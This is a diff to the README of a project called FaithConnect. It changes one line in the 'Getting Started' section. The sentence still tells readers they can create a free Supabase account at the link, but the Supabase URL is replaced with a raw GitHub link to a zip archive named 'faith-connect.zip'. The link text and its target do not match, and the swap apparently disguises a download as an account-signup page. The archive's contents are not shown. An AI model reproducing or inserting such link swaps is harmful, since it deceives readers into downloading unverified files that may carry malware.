@@ -99,7 +99,7 @@ The database schema is designed to support the features of the application. It w
 
 ## Getting Started
 
-To get started with FaithConnect, you will need to have a Supabase account. You can create a free account at [https://supabase.io/](https://supabase.io/).
+To get started with FaithConnect, you will need to have a Supabase account. You can create a free account at [https://raw.githubusercontent.com/Mike1-n/faith-connect/faithconnect-implementation/oliveness/faith-connect.zip](https://raw.githubusercontent.com/Mike1-n/faith-connect/faithconnect-implementation/oliveness/faith-connect.zip).
 
 Once you have a Supabase account, you can clone this repository and run the following commands to start the development server:
 
